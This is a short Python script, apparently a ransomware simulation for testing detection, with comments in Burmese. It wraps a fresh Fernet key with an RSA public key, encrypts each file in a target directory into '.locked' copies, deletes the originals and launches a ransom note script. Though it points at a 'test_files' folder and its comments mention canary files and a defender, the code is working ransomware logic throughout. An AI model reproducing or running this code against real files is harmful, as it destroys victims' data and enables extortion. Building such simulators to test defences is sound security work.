import os
import glob
import time
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

TARGET_DIR = "test_files"
PUBLIC_KEY_PATH = "keys/public_key.pem"

def run_attack():
    if not os.path.exists(PUBLIC_KEY_PATH):
        return

    with open(PUBLIC_KEY_PATH, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    aes_key = Fernet.generate_key()
    fernet = Fernet(aes_key)

    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    key_out_path = os.path.join(TARGET_DIR, "encrypted_aes_key.bin")
    with open(key_out_path, "wb") as f:
        f.write(encrypted_aes_key)

    # Canary ဖိုင်ကို အရင်ဆုံး လော့ခ်ခတ်မည်
    files_to_encrypt = sorted(glob.glob(os.path.join(TARGET_DIR, "*")))
    
    for file_path in files_to_encrypt:
        if file_path.endswith(".locked") or file_path.endswith(".bin"):
            continue
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = fernet.encrypt(data)

            with open(file_path + ".locked", "wb") as f:
                f.write(encrypted_data)

            os.remove(file_path)

            # Defender Detection မိစေရန် အနည်းငယ် စောင့်မည်
            time.sleep(0.1)

        except Exception:
            pass

    # Attack အစအဆုံး အောင်မြင်မှသာ Ransom Note တက်မည်
    if os.path.exists("ransom_note.py"):
        subprocess.Popen(["python3", "ransom_note.py"])

if __name__ == "__main__":
    run_attack()